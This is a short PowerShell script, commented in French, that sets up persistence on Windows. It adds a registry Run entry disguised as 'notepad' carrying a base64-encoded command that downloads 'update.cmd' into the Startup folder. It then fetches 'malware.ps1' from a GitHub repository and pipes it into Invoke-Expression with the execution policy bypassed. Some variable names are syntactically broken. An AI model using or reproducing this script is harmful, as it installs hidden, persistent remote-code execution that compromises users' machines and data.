$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Définition de la commande PowerShell à exécuter au démarrage
$commande-1 = "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/FranceCyberDefense/Live-Hack/main/update.cmd' -OutFile '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.cmd'"

$commandeBase64-1 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commande))

# Création de la nouvelle valeur dans la clé de Registre "Run"
New-ItemProperty -Path $regPath -Name "notepad" -Value "powershell.exe -ExecutionPolicy Bypass -EncodedCommand '$commandeBase64-1'" -PropertyType String -Force | Out-Null
pwsh -NoProfile -NonInteractive -Exec Bypass -c '(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr https://raw.githubusercontent.com/FranceCyberDefense/Live-Hack/main/malware.ps1 -UseBasicParsing|iex'
